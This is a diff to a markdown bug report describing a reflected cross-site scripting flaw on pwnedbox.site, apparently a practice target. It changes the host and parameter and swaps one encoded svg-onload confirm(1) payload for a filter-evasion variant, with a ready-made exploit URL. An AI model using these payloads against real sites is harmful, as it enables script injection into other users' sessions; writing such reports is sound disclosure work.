@@ -4,11 +4,11 @@ Reflected XSS on Form Function
 
 ## Description
 
-**Affected URL:** https://account.pwnedbox.site
+**Affected URL:** https://directory.pwnedbox.site
 
 **Vulnerability Type:** Reflected Cross-Site Scripting (XSS)
 
-**Parameter:** https://account.pwnedbox.site/?lname=
+**Parameter:** https://directory.pwnedbox.site/?fname=
 
 **Severity:** [High]
 
@@ -18,12 +18,12 @@ A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the appli
 
 ## Steps to Reproduce
 
-1. Visit the affected URL :- https://account.pwnedbox.site
+1. Visit the affected URL :- https://directory.pwnedbox.site
 2. Navigate to the vulnerable functionality.
 3. Insert the following XSS payload into the vulnerable parameter:
 
    ```html
-   "><svg onload="&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">
+   1')"--><Svg/OnLoad=(confirm)(1)<!--
    ```
 
 4. Submit the input.
@@ -34,7 +34,9 @@ A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the appli
 ### Screenshot
 
 
-[Insert Screenshot Here]
+<img width="1917" height="415" alt="Screenshot 2026-11-16 103152" src="https://github.com/user-attachments/assets/399daf65-05ec-40a3-8184-d858f25d731e" />
+<img width="1917" height="612" alt="Screenshot 2026-11-16 103146" src="https://github.com/user-attachments/assets/1a1bff16-3100-4324-8924-a669f141b673" />
+
 
 ### Video Demonstration
 
@@ -45,13 +47,13 @@ A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the appli
 
 
 ```http
-https://account.pwnedbox.site/?lname=%22%3E%3Csvg+onload%3D%22%26%2399%3B%26%23111%3B%26%23110%3B%26%23102%3B%26%23105%3B%26%23114%3B%26%23109%3B%26%2340%3B%26%2349%3B%26%2341%3B%22%3E
+https://directory.pwnedbox.site/?fname=1%27%29%22--%3E%3CSvg%2FOnLoad%3D%28confirm%29%281%29%3C%21--
 ```
 
 ### Payload
 
 ```html
-   "><svg onload="&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">
+   1')"--><Svg/OnLoad=(confirm)(1)<!--
 ```
 
 
